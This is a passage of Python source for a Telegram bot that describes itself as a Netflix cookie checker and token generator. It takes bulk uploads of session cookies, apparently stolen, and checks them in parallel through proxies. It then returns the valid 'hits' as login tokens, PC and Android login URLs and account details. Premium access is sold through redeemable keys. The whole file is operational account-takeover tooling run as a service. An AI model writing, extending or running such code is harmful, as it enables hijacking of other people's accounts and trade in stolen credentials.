            token_gen.stats["batch_cancelled"] += 1
            save = False
            await progress_msg.edit_text("\u274c <b>Batch Cancelled</b>", parse_mode=ParseMode.HTML)

        hits = batch_tasks[task_id]["hits"]
        if hits > 0 and save:
            res_list = [f"HIT #{i+1}\n{r}" for i, r in enumerate(all_results)]
            file_content = f"Netflix Results\nHits: {hits}\n\n" + "\n\n".join(res_list)
            file_obj = io.BytesIO(file_content.encode('utf-8', errors='replace'))
            file_obj.name = f"{hits}X_Netflix_Results.txt"
            await bot.send_document(message.chat_id, document=file_obj, reply_to_message_id=message.message_id)
    finally:
        batch_tasks[task_id]["active"] = False
        watchdog_task.cancel()
        if user_id in stop_flags:
            try:
                del stop_flags[user_id]
            except:
                pass
        if task_id in batch_tasks:
            try:
                del batch_tasks[task_id]
            except:
                pass
        if user_id in user_file_store:
            path = user_file_store[user_id]
            cleanup_file(path)
            try:
                del user_file_store[user_id]
            except:
                pass
        cleanup_all_temp()


async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message = update.message
    user_id = message.from_user.id
    if not check_lock(user_id):
        await message.reply_text(LOCK_MSG, parse_mode=ParseMode.HTML)
        return
    if not can_use_batch(user_id):
        await message.reply_text(
            f"\u274c You've reached your daily batch limit ({FREE_DAILY_BATCH_LIMIT}/day).\n"
            f"Free users can process files {FREE_DAILY_BATCH_LIMIT} times per day.\n"
            f"You can still use /chk unlimited times.\n\n"
            f"Use /redeem &lt;key&gt; to get premium access for unlimited file processing.",
            parse_mode=ParseMode.HTML
        )
        return

    doc = message.document
    fname = doc.file_name or "cookies.txt"
    fname_lower = fname.lower()

    if fname_lower.endswith('.zip') or fname_lower.endswith('.rar') or fname_lower.endswith('.7z'):
        try:
            tg_file = await context.bot.get_file(doc.file_id)
            local_path = await download_file_to_disk(tg_file, fname)
            with open(local_path, 'rb') as f:
                file_bytes = f.read()
            cleanup_file(local_path)
        except Exception as e:
            await message.reply_text(f"\u274c Failed to download archive: {e}", parse_mode=ParseMode.HTML)
            return
        increment_batch_usage(user_id)
        logger.info(f"Starting ZIP batch for user {user_id}, file: {fname}, size: {len(file_bytes)} bytes")
        asyncio.get_event_loop().create_task(
            process_zip_file_async(context.bot, message, file_bytes, fname)
        )
        return

    if not fname_lower.endswith('.txt'):
        await message.reply_text("\u274c Please upload a .txt, .zip, .rar or .7z file.", parse_mode=ParseMode.HTML)
        return

    try:
        tg_file = await context.bot.get_file(doc.file_id)
        local_path = await download_file_to_disk(tg_file, fname)
        with open(local_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        cookies = parse_cookie_file_content(content)
        if cookies:
            user_file_store[message.from_user.id] = local_path
            logger.info(f'File saved to {local_path} for processing')
            await message.reply_text(
                f"\u2705 File received: {fname}\n\nReply to this message with:\n"
                f"\u2022 /chk - Check cookies + generate tokens\n"
                f"\u2022 /batch - Batch process all cookies\n"
                f"\u2022 /extract - Extract NetflixId cookies",
                parse_mode=ParseMode.HTML
            )
        else:
            cleanup_file(local_path)
            await message.reply_text("\u274c No valid Netflix cookies found in the file.", parse_mode=ParseMode.HTML)
    except Exception as e:
        await message.reply_text(f"\u274c Error: {e}", parse_mode=ParseMode.HTML)


async def process_zip_file_async(bot, message, zip_bytes, zip_name):
    user_id = message.from_user.id

    logger.info(f"process_zip_file_async started for {zip_name}, {len(zip_bytes)} bytes")
    loop = asyncio.get_event_loop()
    try:
        archive, txt_files, archive_type = await loop.run_in_executor(thread_pool, extract_archive_files, zip_bytes)
    except Exception as e:
        logger.error(f"Archive extraction executor error: {e}")
        await message.reply_text(f"\u274c Failed to extract archive: {e}", parse_mode=ParseMode.HTML)
        return
    logger.info(f"Extraction result: archive={archive is not None}, txt_files={len(txt_files) if txt_files else 0}, type={archive_type}")
    if archive is None:
        await message.reply_text("\u274c No cookie files found in the archive. Make sure the archive contains .txt files with Netflix cookies.", parse_mode=ParseMode.HTML)
        return

    if not txt_files:
        try:
            archive.close()
        except:
            pass
        await message.reply_text("\u274c No .txt files found inside the archive.", parse_mode=ParseMode.HTML)
        return

    all_cookies = []
    file_cookie_map = {}
    read_start = time.time()

    if archive_type == "inmemory" and hasattr(archive, 'cookies') and archive.cookies:
        for txt_name in txt_files:
            cookie_str = archive.cookies.get(txt_name)
            if cookie_str:
                file_cookie_map[txt_name] = [cookie_str]
                all_cookies.append((txt_name, cookie_str))
    else:
        for txt_name in txt_files:
            try:
                content = archive.read(txt_name).decode('utf-8', errors='ignore')
                cookie_str = parse_cookie_file_content(content)
                if cookie_str:
                    file_cookie_map[txt_name] = [cookie_str]
                    all_cookies.append((txt_name, cookie_str))
            except Exception:
                pass
    logger.info(f"Cookie loading: {len(all_cookies)} cookies in {time.time()-read_start:.2f}s")

    try:
        archive.close()
    except:
        pass

    if not all_cookies:
        await message.reply_text("\u274c No Netflix cookies found in any .txt file inside the archive.", parse_mode=ParseMode.HTML)
        return

    total = len(all_cookies)
    total_files = len(file_cookie_map)
    file_size = len(zip_bytes)

    stop_flags[user_id] = {"action": None, "save": True}
    task_id = f"{user_id}_{int(datetime.now().timestamp())}"
    batch_tasks[task_id] = {
        "user_id": user_id, "total": total, "processed": 0,
        "hits": 0, "failed": 0, "errors": 0, "results": [], "started_at": datetime.now(), "active": True,
        "file_name": zip_name, "file_size": file_size,
        "username": f"@{message.from_user.username}" if message.from_user.username else message.from_user.first_name
    }

    token_gen.stats["batch_processes"] += 1

    progress_msg = await message.reply_text(
        f"<b>\U0001f4e6 ZIP Batch Processing Started</b>\n\n"
        f"\U0001f4c2 Files: {total_files} .txt files\n"
        f"\u2705 Found: {total} cookies\n"
        f"\U0001f477 Workers: {WORKER_COUNT}\n"
        f"\u23f3 Starting...\n\n"
        f"/stop - Stop and save | /cancel - Stop without saving",
        parse_mode=ParseMode.HTML
    )

    try:
        username = f"@{message.from_user.username}" if message.from_user.username else message.from_user.first_name
        owner_notify = (
            "<b>\U0001f4cb ZIP Batch Process Started</b>\n\n"
            f"\U0001f464 User: {username} (ID: {user_id})\n"
            f"\U0001f4c1 Archive: {zip_name}\n"
            f"\U0001f4e6 Size: {human_size(file_size)}\n"
            f"\U0001f4c2 Files: {total_files} .txt files\n"
            f"\U0001f36a Cookies: {total}\n"
            f"\U0001f477 Workers: {WORKER_COUNT}\n"
            f"\u23f0 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
        await bot.send_message(int(OWNER_USER_ID), owner_notify, parse_mode=ParseMode.HTML)
    except Exception as e:
        logger.debug(f"Failed to notify owner: {e}")

    all_results = []
    results_lock = asyncio.Lock()
    last_update = {"time": time.time(), "count": 0}

    def process_single(args):
        i, (src_file, cookie_line) = args
        if stop_flags.get(user_id, {}).get("action") in ["stop", "cancel"]:
            return None
        time.sleep(0.5)
        base_name = os.path.basename(src_file).replace('.txt', '')
        label = f"{base_name}_cookie_{i + 1}"
        logger.info(f"[ZIP-BATCH] Worker starting cookie #{i+1}/{total}: {label}")
        try:
            result, err = check_and_generate(cookie_line, label)
            logger.info(f"[ZIP-BATCH] Cookie #{i+1} done: {'HIT' if result else 'FAIL'} err={err}")
            return (i, src_file, result, err)
        except Exception as e:
            logger.error(f"[ZIP-BATCH] Cookie #{i+1} exception: {e}")
            return (i, src_file, None, str(e))

    async def update_progress(force=False):
        processed = batch_tasks[task_id]["processed"]
        now = time.time()
        if not force and processed == last_update["count"]:
            return
        if not force and (now - last_update["time"]) < 3:
            return
        last_update["time"] = now
        last_update["count"] = processed
        hits = batch_tasks[task_id]["hits"]
        failed = batch_tasks[task_id]["failed"]
        errors = batch_tasks[task_id].get("errors", 0)
        rate = (hits / processed * 100) if processed > 0 else 0
        elapsed = now - batch_tasks[task_id]["started_at"].timestamp()
        speed = processed / elapsed if elapsed > 0 else 0
        eta = int((total - processed) / speed) if speed > 0 else 0
        eta_str = f"{eta // 60}m {eta % 60}s" if eta >= 60 else f"{eta}s"
        error_line = f"\n\u26a0\ufe0f Errors: {errors}" if errors > 0 else ""
        try:
            await progress_msg.edit_text(
                f"<b>\U0001f4e6 ZIP Batch Processing</b>\n\n"
                f"\U0001f4ca Progress: {processed}/{total}\n"
                f"\u2705 Hits: {hits}\n"
                f"\u274c Failed: {failed}{error_line}\n"
                f"\U0001f4c8 Hit Rate: {rate:.1f}%\n"
                f"\U0001f477 Workers: {WORKER_COUNT}\n"
                f"\u23f1 Speed: {speed:.1f}/s | ETA: {eta_str}\n\n"
                f"<i>Last Update: {datetime.now().strftime('%H:%M:%S')}</i>\n"
                f"/stop - Stop and save | /cancel - Stop without saving",
                parse_mode=ParseMode.HTML
            )
        except:
            pass

    async def watchdog():
        await asyncio.sleep(5)
        try:
            await progress_msg.edit_text(
                f"<b>\U0001f4e6 ZIP Batch Processing</b>\n\n"
                f"\U0001f4ca Progress: 0/{total}\n"
                f"\u2705 Hits: 0\n"
                f"\u274c Failed: 0\n"
                f"\U0001f477 Workers: {WORKER_COUNT}\n"
                f"\u23f1 Checking cookies...\n\n"
                f"<i>Last Update: {datetime.now().strftime('%H:%M:%S')}</i>\n"
                f"/stop - Stop and save | /cancel - Stop without saving",
                parse_mode=ParseMode.HTML
            )
        except:
            pass
        while batch_tasks.get(task_id, {}).get("active"):
            await asyncio.sleep(10)
            await update_progress()

    watchdog_task = asyncio.create_task(watchdog())

    logger.info(f"[ZIP-BATCH] Submitting {total} cookies to {WORKER_COUNT} workers")
    loop = asyncio.get_event_loop()
    try:
        with concurrent.futures.ThreadPoolExecutor(max_workers=WORKER_COUNT) as executor:
            futures = [loop.run_in_executor(executor, process_single, (i, cd)) for i, cd in enumerate(all_cookies)]
            for coro in asyncio.as_completed(futures):
                result_tuple = await coro
                if result_tuple:
                    i, src_file, result, err = result_tuple
                    async with results_lock:
                        batch_tasks[task_id]["processed"] += 1
                        if result:
                            batch_tasks[task_id]["hits"] += 1
                            all_results.append((src_file, result))
                            batch_tasks[task_id]["results"].append(result)
                        elif err and ('Timeout' in str(err) or 'Network' in str(err) or 'Error:' in str(err) or 'HTTP 5' in str(err) or 'HTTP 429' in str(err) or 'Connection' in str(err)):
                            batch_tasks[task_id]["errors"] += 1
                            batch_tasks[task_id]["failed"] += 1
                        else:
                            batch_tasks[task_id]["failed"] += 1
                else:
                    async with results_lock:
                        batch_tasks[task_id]["processed"] += 1
                        batch_tasks[task_id]["failed"] += 1

                await update_progress()
                if stop_flags.get(user_id, {}).get("action") in ["stop", "cancel"]:
                    break
    finally:
        batch_tasks[task_id]["active"] = False
        watchdog_task.cancel()

    await update_progress(force=True)

    stop_info = stop_flags.get(user_id, {})
    action = stop_info.get("action")
    save = stop_info.get("save", True)
    processed = batch_tasks[task_id]["processed"]
    hits = batch_tasks[task_id]["hits"]
    failed = batch_tasks[task_id]["failed"]
    rate = (hits / processed * 100) if processed > 0 else 0

    if action == "stop":
        token_gen.stats["batch_stopped"] += 1
        try:
            await progress_msg.edit_text(
                f"<b>\U0001f6d1 ZIP Batch Stopped</b>\n\nProcessed: {processed}/{total}\nHits: {hits}\nFailed: {failed}\nHit Rate: {rate:.1f}%\n\n\u2705 Saving results...",
                parse_mode=ParseMode.HTML
            )
        except:
            pass
    elif action == "cancel":
        token_gen.stats["batch_cancelled"] += 1
        save = False
        try:
            await progress_msg.edit_text(
                f"<b>\u274c ZIP Batch Cancelled</b>\n\nProcessed: {processed}/{total}\nDiscarded: {hits} hits\n\n\u26a0\ufe0f No files saved",
                parse_mode=ParseMode.HTML
            )
        except:
            pass
    else:
        try:
            await progress_msg.edit_text(
                f"<b>\U0001f3ac ZIP Batch Complete!</b>\n\nFiles: {total_files}\nTotal: {total}\nHits: {hits}\nFailed: {failed}\nHit Rate: {rate:.1f}%\nWorkers: {WORKER_COUNT}\n\n\u2705 Saving results...",
                parse_mode=ParseMode.HTML
            )
        except:
            pass

    if hits > 0 and save:
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as result_zip:
            combined_content = f"Netflix Checker + Token Results\n{'=' * 60}\n"
            combined_content += f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')}\n"
            combined_content += f"Source: {zip_name}\n"
            combined_content += f"Total Hits: {hits}\n{'=' * 60}\n\n"
            for idx, (src_file, r) in enumerate(all_results, 1):
                combined_content += f"{'=' * 40} HIT #{idx} ({os.path.basename(src_file)}) {'=' * 40}\n{r}\n\n"
            result_zip.writestr(f"{hits}X NetflixCookies @XD_HR.txt", combined_content.encode('utf-8', errors='replace'))

            file_results = {}
            for src_file, r in all_results:
                if src_file not in file_results:
                    file_results[src_file] = []
                file_results[src_file].append(r)

            for src_file, results in file_results.items():
                base = os.path.basename(src_file).replace('.txt', '')
                file_content = f"Results for: {src_file}\n{'=' * 60}\n"
                file_content += f"Hits: {len(results)}\n{'=' * 60}\n\n"
                for idx, r in enumerate(results, 1):
                    file_content += f"{'=' * 40} HIT #{idx} {'=' * 40}\n{r}\n\n"
                result_zip.writestr(f"per_file/{base}_results.txt", file_content.encode('utf-8', errors='replace'))

        zip_buffer.seek(0)
        zip_buffer.name = f"{hits}X NetflixCookies @XD_HR.zip"
        await bot.send_document(
            message.chat_id, document=zip_buffer, reply_to_message_id=message.message_id,
            caption=f"\U0001f4e6 {hits} hits from {total_files} files saved"
        )
    elif hits == 0 and action != "cancel":
        await message.reply_text("\u274c No valid hits found in this zip batch.", parse_mode=ParseMode.HTML)

    if user_id in stop_flags:
        del stop_flags[user_id]
    if task_id in batch_tasks:
        del batch_tasks[task_id]
    cleanup_all_temp()


async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    if not text:
        return

    try:
        if ('NetflixId=' in text or 'netflixid=' in text.lower() or
                'v%3D3%26ct%3D' in text or 'v=3&ct=' in text):
            await update.message.reply_text(
                "\u2705 Netflix cookie detected!\n\n"
                "Use one of these commands:\n"
                "\u2022 /chk - Check cookie + get full info + token\n"
                "\u2022 /gen - Generate login token only\n\n"
                "Or reply to this message with the command.",
                parse_mode=ParseMode.HTML
            )
        else:
            pass
    except Exception as e:
        logger.error(f"handle_message error: {e}")


async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    call = update.callback_query
    data = call.data
    try:
        if data.startswith("get_token_"):
            token_key = data[10:]
            if token_key in user_tokens:
                td = user_tokens[token_key]
                pc_url = td.get('pc_login_url', td.get('login_url', 'N/A'))
                android_url = td.get('android_login_url', pc_url)
                await context.bot.send_message(
                    call.message.chat_id,
                    f"\U0001f511 Full Token:\n{td['token']}\n\n"
                    f"\U0001f4bb PC Login URL:\n{pc_url}\n\n"
                    f"\U0001f4f1 Android Login URL:\n{android_url}",
                    reply_to_message_id=call.message.message_id,
                    parse_mode=ParseMode.HTML
                )
                del user_tokens[token_key]
                await call.answer()
            else:
                await call.answer("\u26a0\ufe0f Token expired or not found", show_alert=True)

        elif data.startswith("save_token_"):
            token_key = data[11:]
            if token_key in user_tokens:
                td = user_tokens[token_key]
                pc_url = td.get('pc_login_url', td.get('login_url', 'N/A'))
                android_url = td.get('android_login_url', pc_url)
                content = (
                    f"Netflix Token\n{'=' * 40}\n\n"
                    f"Token: {td['token']}\n\n"
                    f"PC Login URL: {pc_url}\n\n"
                    f"Android Login URL: {android_url}\n\n"
                    f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')}"
                )
                file_obj = io.BytesIO(content.encode())
                file_obj.name = f"netflix_token_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                await context.bot.send_document(
                    call.message.chat_id, document=file_obj,
                    caption="\U0001f4c1 Token saved to file",
                    reply_to_message_id=call.message.message_id
                )
                del user_tokens[token_key]
                await call.answer()
            else:
                await call.answer("\u26a0\ufe0f Token expired or not found", show_alert=True)
    except Exception as e:
        logger.error(f"Button callback error: {e}")
        await call.answer(f"\u274c Error: {str(e)[:50]}", show_alert=True)


def main():
    print("=" * 70)
    print("\U0001f3ac Netflix Cookie Checker + Token Generator Bot v5.0 (HTTP Bot API)")
    print("\U0001f451 Bot Owner: @XD_HR")
    print("=" * 70)
    print(f"\u2705 Workers: {WORKER_COUNT} (max {MAX_WORKERS})")
    print(f"\u2705 Commands: /chk /gen /extract /batch /stop /cancel /workers /mercy /remove /genkey /redeem /stats")
    print(f"\u2705 Output format: Full account info + login token + cookie")
    print(f"\u2705 Owner ID: {OWNER_USER_ID}")
    print(f"\u2705 Using HTTP Bot API (no API_ID/API_HASH needed)")
    print("=" * 70)

    application = ApplicationBuilder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("mercy", mercy_command))
    application.add_handler(CommandHandler("remove", remove_command))
    application.add_handler(CommandHandler("lock", lock_command))
    application.add_handler(CommandHandler("unlock", unlock_command))
    application.add_handler(CommandHandler("genkey", genkey_command))
    application.add_handler(CommandHandler("redeem", redeem_command))
    application.add_handler(CommandHandler("addproxy", addproxy_command))
    application.add_handler(CommandHandler("removeproxy", removeproxy_command))
    application.add_handler(CommandHandler("proxytest", proxytest_command))
    application.add_handler(CommandHandler("proxylist", proxylist_command))
    application.add_handler(CommandHandler("workers", workers_command))
    application.add_handler(CommandHandler("stats", stats_command))
    application.add_handler(CommandHandler("stop", stop_command))
    application.add_handler(CommandHandler("cancel", cancel_command))
    application.add_handler(CommandHandler("stop_batch", stop_batch_owner))
    application.add_handler(CommandHandler("preview", preview_command))
    application.add_handler(CommandHandler(["chk", "check"], chk_command))
    application.add_handler(CommandHandler(["gen", "generate"], gen_command))
    application.add_handler(CommandHandler("extract", extract_command))
    application.add_handler(CommandHandler("batch", batch_command))
    application.add_handler(MessageHandler(filters.Document.ALL & filters.ChatType.PRIVATE, handle_document))
    application.add_handler(CallbackQueryHandler(button_callback))
    application.add_handler(MessageHandler(filters.TEXT & filters.ChatType.PRIVATE & ~filters.COMMAND, handle_message))

    from telegram.error import Conflict, TimedOut, NetworkError

    async def error_handler(update, context):
        error = context.error
        if isinstance(error, Conflict):
            logger.warning("409 Conflict detected — another bot instance is polling. Waiting...")
            await asyncio.sleep(5)
        elif isinstance(error, (TimedOut, NetworkError)):
            logger.warning(f"Network error: {error}. Retrying...")
            await asyncio.sleep(2)
        else:
            logger.error(f"Unhandled error: {error}", exc_info=context.error)

    application.add_error_handler(error_handler)

    print("[SYSTEM] Starting HTTP Bot API polling...")
    import httpx
    try:
        import asyncio
        async def clear_webhook():
            async with httpx.AsyncClient() as client:
                resp = await client.post(f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook", json={"drop_pending_updates": True})
                logger.info(f"Webhook cleared: {resp.status_code}")
                await asyncio.sleep(2)
                resp2 = await client.post(f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates", json={"offset": -1, "timeout": 1})
                logger.info(f"Updates flushed: {resp2.status_code}")
                await asyncio.sleep(1)
        asyncio.get_event_loop().run_until_complete(clear_webhook())
    except Exception as e:
        print(f"[WARN] Webhook clear: {e}")
    application.run_polling(drop_pending_updates=True, allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
